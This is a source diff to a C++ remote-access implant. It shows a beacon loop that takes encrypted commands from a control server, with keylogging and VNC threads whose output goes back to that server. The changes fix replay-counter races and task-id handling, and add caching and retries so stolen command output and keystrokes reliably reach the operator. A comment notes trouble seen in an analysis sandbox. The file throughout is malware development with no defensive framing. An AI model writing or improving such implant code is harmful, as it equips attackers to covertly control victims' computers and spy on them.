@@ -25,6 +25,7 @@
 #include <sstream>
 #include <iomanip>
 #include <algorithm>
+#include <atomic>
 
 // GDI+ is optional: __has_include keeps a toolchain that ships without these
 // headers on the BMP path below instead of failing the build.
@@ -94,12 +95,22 @@ static std::string g_SrvPubB64;          // last accepted server public point
 // Protocol v2 state - monotonic counters inside the authenticated payloads
 // (replay protection), a per-run id, the pending task ack, and the recently
 // seen task ids used to deduplicate retried tasks.
-static unsigned long long g_TxN       = 0;   // implant -> server counter
+// g_TxN is atomic because SendResult is reachable from the keylog and VNC
+// threads as well as the beacon loop; a torn ++ used to hand two messages the
+// same counter, and the second one died on the server's replay check.
+static std::atomic<unsigned long long> g_TxN{0};   // implant -> server counter
 static unsigned long long g_RxSrvN    = 0;   // last accepted server counter
 static std::wstring       g_RunId;            // 8 hex chars, generated per run
 static std::string        g_PendingAck;       // task id to ack in next beacon
 static std::string        g_SeenTids[32];     // circular buffer of task ids
 static int                g_SeenIdx     = 0;
+
+// Last task's output, kept after delivery so a re-served duplicate can be
+// answered with the REAL result when the first send was lost, not with a
+// placeholder. Touched only on the beacon thread.
+static std::wstring       g_LastTid;
+static std::wstring       g_LastStatus;
+static std::wstring       g_LastResult;
 
 static bool TidSeen(const std::string& tid) {
     for (int i = 0; i < 32; ++i)
@@ -843,6 +854,12 @@ BOOL SendBeacon(const Session& session, std::wstring& taskOut,
     if (cmd.empty()) return TRUE;
 
     std::string dec = cmd;
+    // Plaintext responses carry the task id at the top level, next to "cmd";
+    // encrypted ones carry it inside the blob. Reading it from `dec` alone
+    // (as this used to) meant a plaintext channel never saw a tid at all:
+    // no ack, no dedup, and the at-least-once re-serve re-executed the task
+    // on every beacon — the ANY.RUN process storm.
+    std::string tid = JsonGetString(resp.body, "tid");
     if (JsonFlag(resp.body, "e")) {
         // Encrypted blob decrypts to {"cmd":..,"tid":..,"n":N}.
         dec = AesGcmDecrypt(g_SessionKey, cmd);
@@ -865,8 +882,8 @@ BOOL SendBeacon(const Session& session, std::wstring& taskOut,
         }
         g_RxSrvN = srvN;
         cmd = JsonGetString(dec, "cmd");
+        tid = JsonGetString(dec, "tid");
     }
-    std::string tid = JsonGetString(dec, "tid");
     if (cmd == "sleep" || cmd == "exit") {
         taskOut = UTF8ToWString(cmd);
         return TRUE;
@@ -2437,7 +2454,14 @@ DWORD BeaconLoop(const Session& session) {
                 }
                 DebugLog(L"Exec: " + task + L" tid=" + tid);
                 std::wstring result;
-                if (dup) {
+                if (dup && tid == g_LastTid && !g_LastResult.empty()) {
+                    // Re-served task whose output is still cached: the first
+                    // send was lost, so redeliver the REAL result rather than a
+                    // placeholder — this is what makes at-least-once delivery
+                    // mean at-least-once for the output too.
+                    result = g_LastResult;
+                    status = g_LastStatus;
+                } else if (dup) {
                     // Retried delivery of a task we already ran — the result
                     // went out with the previous run; complete it without re-executing.
                     result = L"[duplicate task - result already delivered]";
@@ -2455,7 +2479,31 @@ DWORD BeaconLoop(const Session& session) {
                     : static_cast<size_t>(config::CMD_OUTPUT_MAX) / sizeof(wchar_t);
                 if (result.size() > cap)
                     result.resize(cap);
-                SendResult(session.sessionId, tid, status, result);
+                // Cache BEFORE the first send attempt: if delivery dies, the
+                // re-served duplicate must find the real output here.
+                g_LastTid    = tid;
+                g_LastStatus = status;
+                g_LastResult = result;
+                BOOL delivered = SendResult(session.sessionId, tid, status, result);
+                if (!delivered) {
+                    // Tunnel hiccup — one quick retry before falling back to the
+                    // redelivery cycle below.
+                    JitterSleep(2, 4);
+                    delivered = SendResult(session.sessionId, tid, status, result);
+                }
+                if (delivered) {
+                    if (!tid.empty()) g_PendingAck = WStringToUTF8(tid);
+                } else {
+                    // Result never landed. Do NOT ack: a task in 'sent' stays
+                    // claimable, so the server re-serves it (rate-limited by
+                    // task_resend_after) and the dup branch above redelivers the
+                    // cached output. Acking here orphaned the task in 'acked'
+                    // with the output gone for good.
+                    g_PendingAck.clear();
+                    ++failures;
+                    BeaconFailureBackoff(failures);
+                    continue;
+                }
                 if (dup) {
                     // The server re-served a task we already ran. Never hot-loop on
                     // a duplicate: fall back to the normal beacon cadence so a stuck
